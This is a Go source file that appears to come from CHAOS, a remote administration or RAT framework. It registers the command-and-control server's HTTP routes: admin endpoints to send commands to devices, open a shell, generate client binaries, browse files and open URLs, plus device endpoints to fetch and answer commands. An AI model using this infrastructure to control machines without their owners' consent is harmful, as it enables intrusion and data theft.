package http

import (
	"github.com/gin-gonic/gin"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/services"
)

type httpController struct {
	Configuration  *environment.Configuration
	Logger         *logrus.Logger
	AuthMiddleware *middleware.JWT
	ClientService  services.Client
	AuthService    services.Auth
	UserService    services.User
	DeviceService  services.Device
	PayloadService services.Payload
	UrlService     services.Url
}

func NewController(
	configuration *environment.Configuration,
	router *gin.Engine,
	log *logrus.Logger,
	authMiddleware *middleware.JWT,
	clientService services.Client,
	systemService services.Auth,
	payloadService services.Payload,
	userService services.User,
	deviceService services.Device,
	urlService services.Url) {
	handler := &httpController{
		Configuration:  configuration,
		AuthMiddleware: authMiddleware,
		Logger:         log,
		ClientService:  clientService,
		PayloadService: payloadService,
		AuthService:    systemService,
		UserService:    userService,
		DeviceService:  deviceService,
		UrlService:     urlService,
	}

	router.NoRoute(handler.noRouteHandler)
	router.GET("/health", handler.healthHandler)
	router.GET("/login", handler.loginHandler)
	router.POST("/auth", authMiddleware.LoginHandler)

	authAdmin := router.Group("")
	authAdmin.Use(authMiddleware.MiddlewareFunc())
	authAdmin.Use(authMiddleware.AuthAdmin) //require admin role token

	auth := router.Group("")
	auth.Use(authMiddleware.MiddlewareFunc())
	{
		authAdmin.GET("/", handler.getDevicesHandler)

		router.GET("/logout", authMiddleware.LogoutHandler)

		authAdmin.GET("/settings", handler.getSettingsHandler)
		authAdmin.GET("/settings/refresh-token", handler.refreshTokenHandler)

		authAdmin.GET("/profile", handler.getUserProfileHandler)
		authAdmin.POST("/user", handler.createUserHandler)
		authAdmin.PUT("/user/password", handler.updateUserPasswordHandler)

		auth.POST("/device", handler.setDeviceHandler)
		authAdmin.GET("/devices", handler.getDevicesHandler)

		authAdmin.POST("/command", handler.sendCommandHandler)
		auth.GET("/command", handler.getCommandHandler)
		auth.PUT("/command", handler.respondCommandHandler)

		authAdmin.GET("/shell", handler.shellHandler)

		authAdmin.GET("/generate", handler.generateBinaryGetHandler)
		authAdmin.POST("/generate", handler.generateBinaryPostHandler)

		authAdmin.GET("/explorer", handler.fileExplorerHandler)

		auth.GET("/download/:filename", handler.downloadFileHandler)
		auth.POST("/upload", handler.uploadFileHandler)

		authAdmin.POST("/open-url", handler.openUrlHandler)
	}
}
